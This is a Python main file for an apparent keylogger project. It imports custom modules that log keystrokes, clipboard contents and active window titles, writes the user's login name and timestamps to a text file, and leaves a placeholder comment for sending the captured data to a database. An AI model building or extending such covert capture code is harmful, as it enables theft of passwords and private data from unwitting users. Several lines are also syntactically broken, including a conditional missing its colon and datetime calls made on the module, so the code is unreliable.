########################################################################################################################
#               This is the main.py for this project where the core of the project's code should be.                   #
#               Try to keep the code as modular as possible by separating it into functions and classes.               #
#                                                                                                                      #
#               - Keano (03-04-2023)                                                                                   #
########################################################################################################################

# Library imports here
import window_info_logger as wilogger
import keystrokes_and_clipboard_logger as kclogger
import os
import datetime
import getpass

def note_time_every_minute(text_file):
    if datetime.minute
        text_file.write(f"time: {datetime.time()}")


def initialise_log_file(text_file):
    user = getpass.getuser()
    text_file.write(f"User: {user}" + "\n")
    text_file.write(f"Date & time: {datetime.now()}\n")
    text_file.write("======================================================" + "\n")


# Main code here
def main():
    if os.path.isfile("test.txt"):
        # Add code for sending data to database here.
        os.remove("test.txt")

    with open('test.txt', 'a+', encoding="utf-8") as f:
        initialise_log_file(f)  # Note user info and starting date + time of keylogger.
        kc_logger_object = kclogger.KeysClipboardLogger(f)  # Start keylogger.
        window_logger_object = wilogger.WindowLogger(f)  # Start window logger.
        # kc_logger_object.start_keylogger(f)  # Uncomment this if you decide to remove it from the object's __init__.
        while True:
            note_time_every_minute(f)
            window_logger_object.log_window()
            kc_logger_object.log_clipboard()


if __name__ == '__main__':
    main()
